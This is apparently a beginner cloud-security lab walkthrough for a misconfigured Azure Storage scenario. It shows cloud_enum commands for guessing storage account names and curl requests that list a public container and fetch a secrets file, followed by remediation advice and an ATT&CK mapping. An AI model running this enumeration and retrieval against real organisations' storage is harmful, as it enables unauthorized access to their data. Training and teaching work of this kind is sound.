# Storage Account Public Access

**Difficulty:** Beginner | **Provider:** Azure | **Category:** Storage Misconfiguration

## Scenario

A company hosts two Azure Storage accounts: a public static website (`*dev`) and a
production account (`*prd`). The production account has a container named `website` with
**container-level** public access (blobs can be listed) and a container named `secrets`
with **blob-level** access (individual blobs can be fetched by direct URL, but the
container cannot be listed).

The `website` container holds a `config.cfg` file that references the path to `flag.txt`
in the `secrets` container.

## Attack Path

```
[Attacker]
    |
    v
Enumerate storage accounts (*dev / *prd naming pattern)
    |
    v
List blobs in 'website' container (container-level access)
    |
    v
Read config.cfg  -->  reveals URL of 'secrets' container
    |
    v
Construct direct URL: <storage>.blob.core.windows.net/secrets/flag.txt
    |
    v
Flag
```

### Step 1 — Enumerate storage accounts

Use [cloud_enum](https://github.com/initstring/cloud_enum) to discover storage accounts by guessing common environment suffixes:

```bash
# Replace XXXX with the unique ID shown after deployment
./cloud_enum.py -k cumulonimbusXXXXprd --disable-aws --disable-gcp

# Real environments often use other suffixes — try them all
./cloud_enum.py -k cumulonimbusXXXXdev --disable-aws --disable-gcp
./cloud_enum.py -k cumulonimbusXXXXtst --disable-aws --disable-gcp
./cloud_enum.py -k cumulonimbusXXXXuat --disable-aws --disable-gcp
./cloud_enum.py -k cumulonimbusXXXXstg --disable-aws --disable-gcp
```

Once you've identified the production account, list the `website` container directly:

```bash
curl "https://cumulonimbusXXXXprd.blob.core.windows.net/website?restype=container&comp=list"
```

### Step 2 — Read config.cfg

```bash
curl "https://cumulonimbusXXXXprd.blob.core.windows.net/website/config.cfg"
```

### Step 3 — Fetch the flag

```bash
curl "https://cumulonimbusXXXXprd.blob.core.windows.net/secrets/flag.txt"
```

## Offensive Tools

- [cloud-enum](https://github.com/initstring/cloud_enum)
- [BlobHunter](https://github.com/cyberark/BlobHunter)
- [Az-Blob-Attacker](https://github.com/VitthalS/Az-Blob-Attacker)
- [MicroBurst](https://github.com/NetSPI/MicroBurst)
- [basicblobfinder](https://github.com/joswr1ght/basicblobfinder)

## How to Fix in Production

1. **Disable anonymous blob access** at the storage account level
   (`allow_blob_public_access = false` in Terraform / "Allow Blob Anonymous Access" = Disabled in the portal).
   This overrides any container-level setting.
2. **Never store path hints in publicly readable blobs** — config files containing
   internal paths defeat the purpose of blob-level access controls.
3. Use **Azure Policy** to audit and deny storage accounts with public access enabled.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Cloud Storage Object Discovery | T1619 |
| Data from Cloud Storage | T1530 |
